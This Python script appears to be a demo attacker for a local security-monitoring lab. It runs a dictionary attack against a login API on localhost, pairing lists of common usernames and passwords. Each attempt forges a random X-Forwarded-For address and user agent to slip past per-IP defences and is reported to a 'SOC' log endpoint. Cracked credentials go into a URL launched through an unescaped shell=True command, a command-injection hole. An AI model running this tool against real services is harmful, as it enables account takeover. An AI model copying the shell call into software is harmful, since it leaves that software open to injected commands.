import requests
import time
import webbrowser
import urllib.parse
import random
import os
import subprocess

# --- CONFIGURATION ---
TARGET_URL = "http://127.0.0.1:5000/api/login"
RESET_URL = "http://127.0.0.1:5000/api/reset"
LOG_URL = "http://127.0.0.1:5000/api/terminal/log"
FRONTEND_URL = "http://localhost:3000"

USERNAMES = ["admin", "root", "user", "support", "dev", "manager", "guest", "test", "sysadmin", "operator", "backup"]
PASSWORDS = ["", "123456", "password", "toor", "welcome", "developer", "admin123", "password123", "12345678", "qwerty", "letmein"]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
]

def soc_log(line):
    print(line)
    try: requests.post(LOG_URL, json={"line": line}, timeout=1)
    except: pass

def perform_attack():
    soc_log("[!] Initializing security audit on: " + TARGET_URL)
    try: requests.post(RESET_URL, timeout=2)
    except: pass

    total_attempts = len(USERNAMES) * len(PASSWORDS)
    current_count = 0
    success_count = 0

    soc_log("[*] Starting exhaustive dictionary sweep (" + str(total_attempts) + " combinations)...")
    soc_log("-" * 80)

    for username in USERNAMES:
        for password in PASSWORDS:
            current_count += 1
            fake_ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            headers = {
                'X-Forwarded-For': fake_ip, 
                'User-Agent': random.choice(USER_AGENTS), 
                'Content-Type': 'application/json'
            }
            payload = {"username": username, "password": password}

            try:
                response = requests.post(TARGET_URL, json=payload, headers=headers, timeout=5)
                is_success = response.status_code == 200
                
                status_label = "SUCCESS" if is_success else "FAILED"
                log_line = f"[{current_count:03}/{total_attempts}] {username:12} | {password or '[EMPTY]':12} | {status_label:7} | HTTP {response.status_code} | IP: {fake_ip}"
                soc_log(log_line)

                if is_success:
                    success_count += 1
                    # --- BULLETPROOF REDIRECT ---
                    # 1. Generate unique timestamp to force a new browser context
                    timestamp_id = int(time.time() * 1000)
                    params = urllib.parse.urlencode({
                        'username': username, 
                        'password': password,
                        'session_id': timestamp_id
                    })
                    target_url = f"{FRONTEND_URL}/login?{params}"
                    
                    # 2. Use subprocess.Popen for a non-blocking, reliable OS call
                    # This bypasses Python's internal webbrowser limitations
                    subprocess.Popen(f'start "" "{target_url}"', shell=True)
                    
                    # 3. IMPORTANT: Delay to prevent the browser from flagging rapid popups
                    # This ensures the OS handles the window opening queue correctly.
                    time.sleep(2.2)
                    
            except requests.exceptions.RequestException:
                soc_log(f"[{current_count:03}/{total_attempts}] ERROR: Connection failure")
            
            # Standard delay between attempts
            time.sleep(0.12)

    soc_log("-" * 80)
    soc_log(f"[FINISH] Audit complete. Total Success: {success_count}")

if __name__ == "__main__":
    perform_attack()
